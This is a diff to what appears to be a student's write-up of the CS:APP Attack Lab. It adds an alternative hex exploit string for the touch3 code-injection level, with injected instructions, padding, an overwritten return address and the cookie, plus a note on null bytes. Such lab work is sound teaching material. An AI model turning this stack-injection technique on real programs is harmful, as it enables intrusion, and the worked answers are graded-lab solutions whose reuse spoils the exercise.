@@ -318,6 +318,20 @@ here we only mention the important part
     37 32 64 66 65 37 61 64 /*  0x72dfe7ad translated to ascii (should be treated as char array) */ 
     ```
 
+    another way:  
+
+    ```txt
+    68 8d 18 40 00 /*           pushq $0x000000000040188d   # the address of touch3 */ 
+    48 bf 38 d4 65 55 00 00
+    00 00 /*                    movabs $0x5565d438, %rdi    # pass the address of the string as the touch3 param */ 
+    c3 /*                       ret                         # instructions total 20 bytes */ 
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68
+    68 68 68 68 68 68 68 68 /*  meaningless values to fill the buffer */ 
+    08 d4 65 55 00 00 00 00 /*  overwrite the ret addr of getbuf with 0x5565d408 */ 
+    37 32 64 66 65 37 61 64 /*  0x72dfe7ad translated to ascii (should be treated as char array) */ 
+    ```
+
 4. deploy the exploit string  
 
 5. record  
@@ -334,6 +348,10 @@ here we only mention the important part
 `0x00` can't be inserted in the string directly  
 (except for it is in the instructions)  
 maybe  
+
+all right, there is actually no this problem  
+the problem may actually caused by  
+the stack contains exploit string overwritten by procedure invoking  
 
 ## 3. Part II : Return-oriented Programming(ROP) Attacks
 
